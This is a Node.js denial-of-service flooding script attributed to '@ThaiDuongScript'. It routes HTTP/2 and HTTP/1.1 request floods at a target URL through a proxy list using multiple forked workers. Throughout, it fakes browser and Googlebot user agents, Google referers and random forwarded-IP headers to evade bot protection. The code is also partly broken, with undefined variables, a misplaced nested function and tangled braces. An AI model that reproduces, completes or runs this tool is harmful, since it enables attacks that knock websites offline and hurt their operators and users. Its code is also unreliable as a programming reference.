// Code by @ThaiDuongScript  

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const UserAgent = require("user-agents");
var colors = require("colors");
const chalk = require('chalk');
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});





const headers = {};
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
  return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

const ip_spoof = () => {
  const getRandomByte = () => {
    return Math.floor(Math.random() * 255);
  };
  return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const spoofed = ip_spoof();

const ip_spoof1 = () => {
  const getRandomByte = () => {
    return Math.floor(Math.random() * 50000);
  };
  return `${getRandomByte()}`;
};

async function editedline() {
  try {} catch (error) {}
}

editedline();

const spoofed1 = ip_spoof1();

const args = {
  target: process.argv[2],
  time: parseInt(process.argv[3]),
  Rate: parseInt(process.argv[4]),
  threads: parseInt(process.argv[5]),
  proxyFile: process.argv[6]
};
const KillScript = () => process.exit(1);

 setTimeout(KillScript, args.time * 1000);
let statusCounts = {};
function getFormattedTime() {
  const now = new Date();
  const date = `${now.getMonth() + 1}/${now.getDate()}/${now.getFullYear()}`;
  const time = now.toLocaleTimeString('en-US', { hour12: true });
  return `${date},${time}`;
}
let isFull = process.argv.includes('--skibidi');
if (process.argv.length < 7) {
    console.clear()
     console.log(
          chalk.italic.white(`node ${process.argv[1]} "https://thaiduongngu.com/" 120 10 10 proxy.txt`)
     );
    process.exit(1);
}

const sig = [
  'ecdsa_secp256r1_sha256',
  'ecdsa_secp384r1_sha384',
  'ecdsa_secp521r1_sha512',
  'rsa_pss_rsae_sha256',
  'rsa_pss_rsae_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha256',
  'rsa_pkcs1_sha384',
  'rsa_pkcs1_sha512'
];
const sigalgs1 = sig.join(':');
const cplist = [
  "ECDHE-ECDSA-AES128-GCM-SHA256",
  "ECDHE-ECDSA-CHACHA20-POLY1305",
  "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-RSA-CHACHA20-POLY1305",
  "ECDHE-ECDSA-AES256-GCM-SHA384",
  "ECDHE-RSA-AES256-GCM-SHA384"
];
const accept_header = [
  '*/*',
  'image/*',
  'image/webp,image/apng',
  'text/html',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
];

lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-ZA'
];

const encoding_header = [
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'
];

const control_header = ["no-cache", "max-age=0"];

const refers = [
  "https://www.google.com/",
  "https://search.google.com/"
];
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers1 = "GREASE:" + [
  defaultCiphers[2],
  defaultCiphers[1],
  defaultCiphers[0],
  ...defaultCiphers.slice(3)
].join(":");
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
const a = getRandomInt(108,131);
const b = getRandomInt(108,128);
const c = getRandomInt(108,129);
const d = getRandomInt(108,131);
const e = getRandomInt(108,127);
const operatingSystems = ["Windows NT 10.0", "Macintosh", "X11","Linux"];
const architectures = {
  "Windows NT 10.0":`Win64; x64`,
  "Macintosh": `Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}`  ,
  "X11": `Linux x86_64`,
 "Linux":  Math.random() < 0.5 ? `Android 10;K`: `Android 11;K`,
};




function getRandomValue(arr) {
  const randomIndex = Math.floor(Math.random() * arr.length);
  return arr[randomIndex];
}

const randomOS = getRandomValue(operatingSystems);
const randomArch = architectures[randomOS]; 





let ch_ua_v;
    if (randomOS === "Windows NT 10.0") {
        ch_ua_v = `Windows`;
    }
else if (randomOS === "Macintosh") {
        ch_ua_v = `macOSX`;
    }
 else if (randomOS === "X11") {
        ch_ua_v = `Linux`;
    }
  else if (randomOS === "Linux") {
        ch_ua_v = `Android`;
    }


const ch_ua_ver = `${ch_ua_v}`;
const browserVersion = getRandomInt(125,130);
    const fwfw = ['Google Chrome'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
    let brandValue;
    if (browserVersion === 125) {
        brandValue = `"Not_A Brand";v="99", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 126) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 127) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
  else if (browserVersion === 128) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
  else if (browserVersion === 129) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
  else if (browserVersion === 130) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    const isBrave = wfwf === 'Brave';

 const acceptHeaderValue = isBrave
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

                        const langValue = isBrave
                            ? 'en-US,en;q=0.9'
                            : 'en-US,en;q=0.7';

    
 const ua1 = `Mozilla/5.0 (iPhone; CPU iPhone OS 1${randstra(1)}_${randstra(1)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/${a}.0.5615.70 Mobile/15E148 Safari/604.1`;
 const ua2 = `Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/${a}.0.${b}.${c} Safari/537.36`;
 const ua3 = `Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${a}.0.${b}.${c} Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)`;
    const secChUa = `${brandValue}`;
const ua = [
ua1,
ua2,
ua3,
];



const rateHeaders = [
  { "akamai-origin-hop": spoofed },
  { "proxy-client-ip": spoofed },
  { "via": spoofed },
  { "cluster-ip": spoofed },
];


var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))] + "search?page=" + randstr(22) + "/url=https://thaiduongngu.com/login.php/" + randstr(7);
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
var u = ua[Math.floor(Math.floor(Math.random() * ua.length))];
var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {




  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
 } else { setInterval(runFlooder) }

class NetSocket {
  constructor() { }

  HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
      host: options.host,
      port: options.port
    });

    connection.setTimeout(options.timeout * 100000);
    connection.setKeepAlive(true, 100000);

    connection.on("connect", () => {
      connection.write(buffer);
    });

    connection.on("data", chunk => {
      const response = chunk.toString("utf-8");
      const isAlive = response.includes("HTTP/1.1 200");
      if (isAlive === false) {
        connection.destroy();
        return callback(undefined, "error: invalid response from proxy server");
      }
      return callback(connection, undefined);
    });

    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "error: timeout exceeded");
    });

    connection.on("error", error => {
      connection.destroy();
      return callback(undefined, "error: " + error);
    });
  }
}

const Socker = new NetSocket();
headers["x-forwarded-for"] = "192.168.1.1";
headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?robots.txt=" + randstr(15) + ":" + randstr(9);
headers[":scheme"] = "https";
headers["referer"] = Ref;
headers["origin"] = "https://www.google.com/" + "page=" + randstr(12) ;
headers["sec-ch-ua"] = secChUa;
headers["sec-ch-ua-platform"] = ch_ua_ver;
headers["sec-ch-ua-mobile"] = "?0";
headers["accept-encoding"] = encoding;
headers["accept-language"] = lang;
headers["user-agent"] = u;
headers["upgrade-insecure-requests"] = "1";
headers["accept"] = accept;
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-site"] = "same-origin";
headers["sec-fetch-user"] = "?1";
headers["x-requested-with"] = "XMLHttpRequest";



function buildRequest() {
    

    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];



    const isBrave = wfwf === 'Brave';

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';


    const langValue = isBrave
        ? 'en-US,en;q=0.6'
        : 'en-US,en;q=0.7';

        
const a = getRandomInt(99,113);


const ua = `Mozilla/5.0 (Macintosh; Intel Mac OS X 1${randstra(1)}.${randstra(1)}; rv:${a}.0) Gecko/20100101 Firefox/${a}.0`;

    


    
    let mysor = '\r\n';
    let mysor1 = '\r\n';

    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        `Accept-Language: ${langValue}\r\n` +
        'Cache-Control: max-age=0\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ua\r\n` + mysor1;


    

    const mmm = Buffer.from(`${headers}`, 'binary');
    return mmm;
}

const h1payl = Buffer.concat(new Array(1).fill(buildRequest()))


function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");

  const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: parsedTarget.host + ":443",
    timeout: 300,
  };

  Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return;

    connection.setKeepAlive(true, 200000);

    const tlsOptions = {
       secure: true,
      ALPNProtocols: ['h2'],
      sigals: siga,
      requestCert: false,
      socket: connection,
      ciphers: cipper,
      ecdhCurve: "X25519",
      host: parsedTarget.host,
      rejectUnauthorized: false,
      servername: parsedTarget.host,
      secureProtocol: "TLS_method",
    };
function main() {
                        tlsSocket.write(h1payl, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    main()
                                }, isFull ? 1 : 1000 / args.Rate)
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    
                    main()

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })
                    return
                }
    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

    tlsConn.setKeepAlive(true, 60000);

    const client = http2.connect(parsedTarget.href, {
      protocol: "https:",
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 10000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 65536,
        enablePush: false
      },
      maxSessionMemory: 64000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => tlsConn,
      socket: connection,
    });

    client.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 10000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 65536,
      enablePush: false
    });
setInterval(() => {
	console.clear()
  console.log(`${getFormattedTime()} ${JSON.stringify(statusCounts)}`);
}, 1500);

client.on("connect", () => {
  const IntervalAttack = setInterval(() => {
    const dynHeaders = {
      ...headers,
      ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
    };
    for (let i = 0; i < args.Rate; i++) {
      const request = client.request(dynHeaders);

      request.on("response", (headers) => {
        const status = headers[':status'];
        
        
        statusCounts[status] = (statusCounts[status] || 0) + 1;

        if (status === 403) {
          client.close();
          client.destroy();
          tlsOptions.destroy();
          delete u;
        }
        request.close();
        request.destroy();
      });

      request.on("error", (err) => {
        request.close();
        request.destroy();
      });

      request.end();
    }
  }, 500);
});

    client.on("close", () => {
      client.destroy();
      connection.destroy();
      return;
    });
  }, function (error, response, body) {
    connection.destroy();
    console.log("Error:", error);
  });
}
client.on("error", (error) => {
if (error.code === "ERR_HTTP2_GOAWAY_SESSION" || error.code === "ECONNRESET" || error.code == "ERR_HTTP2_ERROR") {
                    client.close(); //(socket close)
                }
            })

